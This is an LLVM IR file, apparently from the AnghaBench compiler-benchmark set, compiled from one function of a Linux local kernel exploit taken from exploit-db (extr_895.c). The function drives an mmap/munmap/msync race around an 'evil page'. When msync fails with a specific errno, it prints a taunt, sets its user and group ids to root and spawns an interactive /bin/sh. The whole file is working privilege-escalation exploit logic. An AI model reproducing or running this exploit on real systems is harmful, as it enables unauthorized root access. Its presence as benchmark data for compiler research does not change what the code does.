; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_895.c_thread.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_895.c_thread.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"(sleep1)\0A\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"(sleep1 finished)\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"trying to mmap back the evil page\0A\00", align 1
@VMAFILL = common dso_local global i32 0, align 4
@swapmem = common dso_local global i8* null, align 8
@PAGE_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@fd3 = common dso_local global i32 0, align 4
@vmamem = common dso_local global i8* null, align 8
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [17 x i8] c"%p, evil mapped\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"(sleep2)\0A\00", align 1
@sem = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [19 x i8] c"(sleep2 finished)\0A\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"doing msync\0A\00", align 1
@.str.7 = private unnamed_addr constant [19 x i8] c"still doing msync\0A\00", align 1
@MS_SYNC = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [30 x i8] c"finished msync, %d, errno=%d\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [18 x i8] c"y4'r3 1uCky k1d!\0A\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"-i\00", align 1
@.str.13 = private unnamed_addr constant [18 x i8] c"execve failed %d\0A\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c":(\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @thread to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @thread(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %6 = call i32 (...) @wait4sig()
  %7 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  %8 = call i32 @usleep(i32 300000)
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %11

11:                                               ; preds = %58, %1
  %12 = load i32, i32* %5, align 4
  %13 = load i32, i32* @VMAFILL, align 4
  %14 = icmp slt i32 %12, %13
  br i1 %14, label %15, label %61

15:                                               ; preds = %11
  %16 = load i32, i32* %5, align 4
  %17 = load i32, i32* @VMAFILL, align 4
  %18 = sdiv i32 %17, 2
  %19 = icmp eq i32 %16, %18
  br i1 %19, label %20, label %35

20:                                               ; preds = %15
  %21 = load i8*, i8** @swapmem, align 8
  %22 = load i32, i32* @PAGE_SIZE, align 4
  %23 = mul nsw i32 %22, 2
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %21, i64 %24
  %26 = load i32, i32* @PAGE_SIZE, align 4
  %27 = load i32, i32* @PROT_READ, align 4
  %28 = load i32, i32* @PROT_WRITE, align 4
  %29 = or i32 %27, %28
  %30 = load i32, i32* @MAP_SHARED, align 4
  %31 = load i32, i32* @MAP_FIXED, align 4
  %32 = or i32 %30, %31
  %33 = load i32, i32* @fd3, align 4
  %34 = call i32 @mmap(i8* %25, i32 %26, i32 %29, i32 %32, i32 %33, i32 0)
  store i32 %34, i32* %4, align 4
  br label %35

35:                                               ; preds = %20, %15
  %36 = load i8*, i8** @vmamem, align 8
  %37 = load i32, i32* %5, align 4
  %38 = load i32, i32* @PAGE_SIZE, align 4
  %39 = mul nsw i32 %37, %38
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %36, i64 %40
  %42 = load i32, i32* @PAGE_SIZE, align 4
  %43 = load i32, i32* @PROT_READ, align 4
  %44 = load i32, i32* %5, align 4
  %45 = and i32 %44, 1
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %49

47:                                               ; preds = %35
  %48 = load i32, i32* @PROT_WRITE, align 4
  br label %51

49:                                               ; preds = %35
  %50 = load i32, i32* @PROT_EXEC, align 4
  br label %51

51:                                               ; preds = %49, %47
  %52 = phi i32 [ %48, %47 ], [ %50, %49 ]
  %53 = or i32 %43, %52
  %54 = load i32, i32* @MAP_PRIVATE, align 4
  %55 = load i32, i32* @MAP_ANONYMOUS, align 4
  %56 = or i32 %54, %55
  %57 = call i32 @mmap(i8* %41, i32 %42, i32 %53, i32 %56, i32 0, i32 0)
  br label %58

58:                                               ; preds = %51
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %5, align 4
  br label %11

61:                                               ; preds = %11
  %62 = load i8*, i8** @swapmem, align 8
  %63 = load i32, i32* @PAGE_SIZE, align 4
  %64 = mul nsw i32 %63, 2
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  store i8 120, i8* %66, align 1
  %67 = load i32, i32* %4, align 4
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i32 %67)
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %70 = load i64, i64* @sem, align 8
  %71 = icmp ne i64 %70, 0
  br i1 %71, label %72, label %74

72:                                               ; preds = %61
  %73 = call i32 (...) @cleanup()
  br label %74

74:                                               ; preds = %72, %61
  %75 = load i32, i32* %3, align 4
  %76 = call i32 @sendsig(i32 %75)
  %77 = call i32 @usleep(i32 300000)
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  %79 = load i64, i64* @sem, align 8
  %80 = icmp ne i64 %79, 0
  br i1 %80, label %81, label %83

81:                                               ; preds = %74
  %82 = call i32 (...) @cleanup()
  br label %83

83:                                               ; preds = %81, %74
  %84 = load i8*, i8** @vmamem, align 8
  %85 = load i32, i32* @VMAFILL, align 4
  %86 = load i32, i32* @PAGE_SIZE, align 4
  %87 = mul nsw i32 %85, %86
  %88 = call i32 @munmap(i8* %84, i32 %87)
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0))
  %91 = load i8*, i8** @swapmem, align 8
  %92 = load i32, i32* @PAGE_SIZE, align 4
  %93 = mul nsw i32 %92, 2
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %91, i64 %94
  %96 = load i32, i32* @PAGE_SIZE, align 4
  %97 = mul nsw i32 %96, 4
  %98 = load i32, i32* @MS_SYNC, align 4
  %99 = call i32 @msync(i8* %95, i32 %97, i32 %98)
  store i32 %99, i32* %4, align 4
  %100 = load i32, i32* %4, align 4
  %101 = load i32, i32* @errno, align 4
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0), i32 %100, i32 %101)
  %103 = load i32, i32* %4, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %116

105:                                              ; preds = %83
  %106 = load i32, i32* @errno, align 4
  %107 = icmp eq i32 %106, 123
  br i1 %107, label %108, label %116

108:                                              ; preds = %105
  store i64 0, i64* @sem, align 8
  %109 = call i32 (...) @killall()
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  %111 = call i32 @setresuid(i32 0, i32 0, i32 0)
  %112 = call i32 @setresgid(i32 0, i32 0, i32 0)
  %113 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i32* null)
  %114 = load i32, i32* @errno, align 4
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0), i32 %114)
  br label %116

116:                                              ; preds = %108, %105, %83
  %117 = load i64, i64* @sem, align 8
  %118 = icmp ne i64 %117, 0
  br i1 %118, label %122, label %119

119:                                              ; preds = %116
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0))
  %121 = call i32 (...) @cleanup()
  br label %122

122:                                              ; preds = %119, %116
  %123 = call i32 @_exit(i32 0) #3
  unreachable
}

declare dso_local i32 @wait4sig(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @cleanup(...) #1

declare dso_local i32 @sendsig(i32) #1

declare dso_local i32 @munmap(i8*, i32) #1

declare dso_local i32 @msync(i8*, i32, i32) #1

declare dso_local i32 @killall(...) #1

declare dso_local i32 @setresuid(i32, i32, i32) #1

declare dso_local i32 @setresgid(i32, i32, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
